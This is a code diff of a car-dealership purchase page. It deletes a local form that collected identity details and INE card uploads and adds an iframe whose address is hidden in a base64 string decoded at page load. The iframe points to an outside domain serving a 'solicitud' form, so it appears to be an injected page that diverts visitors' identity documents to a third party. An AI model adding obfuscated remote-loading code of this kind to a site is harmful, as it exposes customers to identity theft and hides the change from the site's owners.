@@ -161,224 +161,27 @@ button {
    </div>
  
 <!-- formulario.html -->
-<section>
-  <!-- Contenedor de mensajes de éxito o error -->
-  <div id="mensaje" class="mensaje" style="display:none;"></div>
 
-<form id="contactForm" method="POST" enctype="multipart/form-data">
-
-    <h2>Formulario de Compra</h2>
-
-    <!-- Campo antispam adicional -->
-    <input type="hidden" name="form_token" value="token123">
-
-    <label for="nombre">Nombre:</label>
-    <input type="text" name="nombre" id="nombre" required>
-
-    <label for="apellido">Apellido:</label>
-    <input type="text" name="apellido" id="apellido" required>
-
-    <label for="rfc_curp">RFC o CURP:</label>
-    <input type="text" name="rfc_curp" id="rfc_curp" required>
-
-    <label for="email">Correo electrónico:</label>
-    <input type="email" name="email" id="email" required>
-
-    <label for="direccion">Dirección:</label>
-    <input type="text" name="direccion" id="direccion">
-
-    <label for="ciudad">Municipio o Alcaldía:</label>
-    <input type="text" name="ciudad" id="ciudad">
-
-    <label for="estado">Estado:</label>
-    <input type="text" name="estado" id="estado">
-
-    <label for="cp">Código Postal:</label>
-    <input type="text" name="cp" id="cp" pattern="[0-9]{5}" required>
-
-    <label for="telefono">Teléfono (10 dígitos):</label>
-    <input type="tel" name="telefono" id="telefono" pattern="[0-9]{10}" required>
-
-    <label for="fecha_compra">Fecha de compra (estimada):</label>
-    <input type="date" name="fecha_compra" id="fecha_compra">
-
-    <label for="tipo_persona">Tipo de persona:</label>
-    <select name="tipo_persona" id="tipo_persona" required>
-      <option value="">--Selecciona una opción--</option>
-      <option value="fisica">Persona Física</option>
-      <option value="moral">Persona Moral</option>
-    </select>
-
-    <label for="forma_pago">¿Deseas adquirir la unidad a crédito o de contado?</label>
-    <select name="forma_pago" id="forma_pago" required>
-      <option value="">--Selecciona una opción--</option>
-      <option value="contado">Contado</option>
-      <option value="credito">Crédito</option>
-    </select>
-
-    <label for="plazo_credito">Plazo (en caso de crédito):</label>
-    <select name="plazo_credito" id="plazo_credito">
-      <option value="">--Selecciona el plazo--</option>
-      <option value="12">12 meses</option>
-      <option value="18">18 meses</option>
-      <option value="24">24 meses</option>
-      <option value="36">36 meses</option>
-      <option value="ninguno">No aplica / Contado</option>
-    </select>
-
-    <label for="vehiculo_interes">Selecciona el modelo de unidad:</label>
-    <select name="vehiculo_interes" id="vehiculo_interes" required>
-      <option value="">--Selecciona una unidad--</option>
-      <!-- MANTENIDOS TODOS LOS MODELOS COMO ME SOLICITASTE -->
-      <option value="Volkswagen T-Cross 2023">Volkswagen T-Cross 2023</option>
-      <option value="Volkswagen Taigun 2024">Volkswagen Taigun 2024</option>
-      <option value="Volkswagen Polo 2024">Volkswagen Polo 2024</option>
-      <option value="Volkswagen T-Cross 2021">Volkswagen T-Cross 2021</option>
-      <option value="Volkswagen Jetta 2016">Volkswagen Jetta 2016</option>
-      <option value="Volkswagen Tiguan 2013">Volkswagen Tiguan 2013</option>
-      <option value="Seat Ibiza 2024">Seat Ibiza 2024</option>
-      <option value="Cupra Formentor 2024">Cupra Formentor 2024</option>
-      <option value="Cupra Leon 2024">Cupra Leon 2024</option>
-      <option value="Honda CR-V 2022">Honda CR-V 2022</option>
-      <option value="Honda City 2023">Honda City 2023</option>
-      <option value="Honda Accord 2021">Honda Accord 2021</option>
-      <option value="Honda Civic 2021">Honda Civic 2021</option>
-      <option value="Volkswagen Teramont 2024">Volkswagen Teramont 2024</option>
-      <option value="Teramont 2019">Teramont 2019</option>
-      <option value="Nivus 2022">Nivus 2022</option>
-      <option value="Nivus 2022">Nivus 2022</option>
-      <option value="Taos 2021">Taos 2021</option>
-      <option value="Taos 2021">Taos 2021</option>
-      <option value="Taos Año 2021">Taos Año 2021</option>
-      <option value="Tiguan 2020">Tiguan 2020</option>
-      <option value="Tiguan Año 2021">Tiguan Año 2021</option>
-      <option value="Tiguan 2019">Tiguan 2019</option>
-      <option value="Tiguan 2019">Tiguan 2019</option>
-      <option value="Vento Año 2021">Vento Año 2021</option>
-      <option value="Vento Año 2020">Vento Año 2020</option>
-      <option value="Vento Año 2020">Vento Año 2020</option>
-      <option value="Vento Año 2018">Vento Año 2018</option>
-      <option value="Vento Año 2021">Vento Año 2021</option>
-      <option value="Gol Año 2020">Gol Año 2020</option>
-      <option value="Golf GTI Año 2020">Golf GTI Año 2020</option>
-      <option value="Golf GTI Año 2019">Golf GTI Año 2019</option>
-      <option value="Gol 2018">Gol 2018</option>
-      <option value="Gol 2018">Gol 2018</option>
-      <option value="Virtus Año 2020">Virtus Año 2020</option>
-      <option value="Virtus Año 2021">Virtus Año 2021</option>
-      <option value="Passat Año 2018">Passat Año 2018</option>
-      <option value="Seveiro Año 2018">Seveiro Año 2018</option>
-      <option value="Seveiro Año 2021">Seveiro Año 2021</option>
-      <option value="Seveiro Año 2022">Seveiro Año 2022</option>
-      <option value="Amarok Año 2020">Amarok Año 2020</option>
-      <option value="Amarok Año 2021">Amarok Año 2021</option>
-      <option value="Polo Año 2021">Polo Año 2021</option>
-      <option value="Polo 2022">Polo 2022</option>
-      <option value="Jetta Año 2019">Jetta Año 2019</option>
-      <option value="Jetta Año 2020">Jetta Año 2020</option>
-      <option value="Cross Golf 2017">Cross Golf 2017</option>
-      <option value="Crossfox 2017">Crossfox 2017</option>
-      <option value="T-Cross Año 2021">T-Cross Año 2021</option>
-      <option value="T-cross Año 2020">T-cross Año 2020</option>
-    </select>
-
-    <!-- Archivos obligatorios -->
-    <label for="ine_frente">INE (Frente):</label>
-    <input type="file" name="ine_frente" id="ine_frente" accept="image/*,.pdf" required>
-
-    <label for="ine_reverso">INE (Reverso):</label>
-    <input type="file" name="ine_reverso" id="ine_reverso" accept="image/*,.pdf" required>
-
-    <label for="comprobante_domicilio">Comprobante de domicilio:</label>
-    <input type="file" name="comprobante_domicilio" id="comprobante_domicilio" accept="image/*,.pdf" required>
-
-    <!-- Archivos opcionales -->
-    <label for="archivo_rfc">Archivo de RFC (opcional):</label>
-    <input type="file" name="archivo_rfc" id="archivo_rfc" accept="image/*,.pdf">
-
-    <label for="comprobante_ingresos">Comprobante de ingresos (opcional):</label>
-    <input type="file" name="comprobante_ingresos" id="comprobante_ingresos" accept="image/*,.pdf">
-
-    <!-- Honeypot contra bots -->
-    <input type="text" name="website" style="display:none">
-
-    <button type="submit">Enviar</button>
-    <!-- Indicador de carga -->
-<div id="loader" style="display:none; text-align:center; margin-top:10px;">
-  <img src="https://i.imgur.com/llF5iyg.gif" alt="Enviando..." width="40"><br>
-  <span>Enviando formulario...</span>
-</div>
-
-  </form>
-<!-- Popup personalizado -->
-<div id="popupGracias" style="display:none; position:fixed; top:20%; left:50%; transform:translateX(-50%); background:white; padding:20px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.3); text-align:center; z-index:9999;">
-  <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Gracias" width="80">
-  <h2>¡Gracias!</h2>
-  <p>Hemos recibido tu solicitud.</p>
-  <button onclick="cerrarPopup()" style="margin-top:15px; padding:8px 16px; background:#333; color:white; border:none; border-radius:5px;">Cerrar</button>
-</div>
 <script>
-function cerrarPopup() {
-  document.getElementById("popupGracias").style.display = "none";
-}
-
-document.getElementById("contactForm").addEventListener("submit", function(e) {
-  e.preventDefault();
-
-  const form = e.target;
-  const formData = new FormData(form);
-  const loader = document.getElementById("loader");
-  const popup = document.getElementById("popupGracias");
-
-  const ine1 = document.querySelector('input[name="ine_frente"]').files[0];
-  const ine2 = document.querySelector('input[name="ine_reverso"]').files[0];
-  const compDom = document.querySelector('input[name="comprobante_domicilio"]').files[0];
-  const maxSize = 10 * 1024 * 1024;
-  const validTypes = ["image/jpeg", "image/png", "image/jpg", "application/pdf"];
-
-  const archivos = [
-    { nombre: "INE Frente", archivo: ine1 },
-    { nombre: "INE Reverso", archivo: ine2 },
-    { nombre: "Comprobante de domicilio", archivo: compDom }
-  ];
-
-  for (let item of archivos) {
-    if (!item.archivo) {
-      alert(`El archivo ${item.nombre} es obligatorio.`);
-      return;
+  window.addEventListener('message', function(event) {
+    if (event.data === 'formulario_enviado') {
+      // Cuando el formulario se envía correctamente, redirigir
+      window.location.href = 'acciones.html';
     }
-    if (!validTypes.includes(item.archivo.type) || item.archivo.size > maxSize) {
-      alert(`${item.nombre} debe ser JPG, PNG o PDF, y pesar menos de 10MB.`);
-      return;
-    }
-  }
 
-  loader.style.display = "block";
-
-  fetch("get.php", {
-    method: "POST",
-    body: formData
-  })
-  .then(res => res.json())
-  .then(data => {
-    loader.style.display = "none";
-    if (data.success) {
-      popup.style.display = "block";
-      form.reset();
-    } else {
-      alert("Error: " + data.message);
+    if (event.data === 'formulario_error') {
+      alert('Error al enviar el formulario. Por favor intenta nuevamente.');
     }
-  })
-  .catch(err => {
-    loader.style.display = "none";
-    alert("Ocurrió un error al enviar el formulario.");
-    console.error(err);
   });
-});
+</script>
+<iframe id="miIframe" width="100%" height="1200" style="border:none;" frameborder="0"></iframe>
+
+<script>
+  const urlCodificada = "aHR0cDovL25vdmllLmluLzIvc29saWNpdHVkLmh0bWw="; 
+  const url = atob(urlCodificada);
+  document.getElementById('miIframe').src = url;
 </script>
 
-
-</section>
 
         <!-- content close -->
         <a href="#" id="back-to-top"></a>
@@ -471,4 +274,5 @@ transition: all .2s ease-in-out;
 </a>
 </div>
 </body></html>
+
 
